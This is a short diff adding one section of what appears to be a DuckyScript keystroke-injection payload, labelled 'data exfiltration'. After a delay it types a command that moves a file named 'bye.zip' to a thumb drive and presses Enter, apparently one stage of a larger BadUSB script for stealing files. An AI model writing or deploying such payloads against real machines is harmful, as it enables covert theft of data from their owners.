@@ -1,0 +1,11 @@
+REM #######################################################
+REM #                                                     #
+REM #            PART 6.2 DATA EXFULTARTION               #
+REM #                                                     #
+REM #######################################################
+
+
+DELAY 1000 
+STRING move_zip_to_thumb_drive('bye.zip', thumb_drive_path)
+DELAY 400
+ENTER 
